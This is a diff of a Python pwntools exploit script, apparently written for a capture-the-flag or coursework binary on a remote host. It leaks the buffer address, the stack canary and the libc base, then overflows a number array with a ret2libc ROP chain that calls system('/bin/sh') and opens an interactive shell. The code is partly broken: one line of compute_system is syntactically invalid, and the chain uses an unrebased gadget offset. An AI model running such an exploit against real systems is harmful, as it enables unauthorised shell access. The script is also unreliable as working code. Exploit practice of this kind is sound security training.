@@ -16,12 +16,6 @@ def genbin(binary_name):
 		print(f"An exception occurred: {e}")
 		exit(-1)
 
-context.terminal = ['tmux', 'splitw', '-h']
-#context.log_level = "error"
-
-# breakpoints
-add_numbers = "add_numbers:167"
-
 def leak_buffer(r):
     r.sendline(b"0")
     time.sleep(0.2)
@@ -79,10 +73,13 @@ def leak_canary(r, buffer):
     r.recvrepeat(timeout=0.2)
     return canary
 
-def compute_system(libc_leak):
-   return libc_leak & 0xfffffffffff00000 | 0x0000000000050d60
+def compute_system(libc_base):
+   return libc_base & 0x7f7b0a2280000 50d60
 
-def leak_libc(r, buffer, canary, sRIP):
+def compute_bin_sh(libc_base):
+    return libc_base + 0x1d8698
+
+def leak_libc_base(r, buffer, canary, sRIP):
     r.sendline(b"0")
     time.sleep(0.2)
     r.sendline(b"14")                   # add 14 numbers
@@ -112,9 +109,9 @@ def leak_libc(r, buffer, canary, sRIP):
     r.sendline(b"1")
     time.sleep(0.2)
     r.recvlines(17)
-    sRIP_libc = int(r.recvlineS(keepends=False))
+    libc_base = int(r.recvlineS(keepends=False)) - 0x1d90
     r.recvrepeat(timeout=0.2)
-    return sRIP_libc
+    return libc_base
 
 if args["REMOTE"]:
 	r = remote("bin.offdef.jinblack.it", 3003)
@@ -129,14 +126,57 @@ else:
         """)
         input("wait")
 
+context.terminal = ['tmux', 'splitw', '-h']
+#context.log_level = "error"
+
+# breakpoints
+add_numbers = "add_numbers:167"
+
+#gadgets
+pop_rdi = 0x000000000002a3e5
+
 buffer = leak_buffer(r)
 sRIP_main = leak_sRIP_main(r)
 canary = leak_canary(r, buffer)
-sRIP_libc = leak_libc(r, buffer, canary, sRIP_main)
-libc_system = compute_system(sRIP_libc)
+libc_base = leak_libc_base(r, buffer, canary, sRIP_main)
+libc_system = compute_system(libc_base)
+libc_bin_sh = compute_bin_sh(libc_base)
+libc_pop_rdi = libc_base + pop_rdi
 print("buffer:\t", hex(buffer))
 print("sRIP:\t", hex(sRIP_main))
 print("canary:\t", hex(canary))
-print("sRIP_libc:\t", hex(sRIP_libc))
+print("libc_base:\t", hex(libc_base))
 print("libc_system:\t", hex(libc_system))
+print("libc_bin_sh:\t", hex(libc_bin_sh))
+
+r.sendline(b"0")
+time.sleep(0.2)
+r.sendline(b"14")                   # add 14 numbers
+time.sleep(0.2)
+for i in range(9):
+    r.sendline(b"")
+    time.sleep(0.2)
+r.sendline(b"42949672959")          # i = 9
+time.sleep(0.2)
+r.sendline(b"85899345919")          # temp_numbers = 19
+time.sleep(0.2)
+r.sendline(b"")                     # number
+time.sleep(0.2)
+r.sendline(str(buffer).encode())    # buffer
+time.sleep(0.2)
+r.sendline(str(canary).encode())    # canary
+time.sleep(0.2)
+r.sendline(b"")                     # sRBP (main)
+time.sleep(0.2)
+r.sendline(str(pop_rdi).encode())   # sRIP (main) / gadget
+time.sleep(0.2)
+r.sendline(str(libc_bin_sh).encode()) # sRBP (__libc_call_main)
+time.sleep(0.2)
+r.sendline(str(libc_system).encode()) # on top of sRIP (__libc_call_main)
+time.sleep(0.2)
+r.sendline(b"")
+time.sleep(0.2)
+
+gdb.attach(r)
+
 r.interactive()
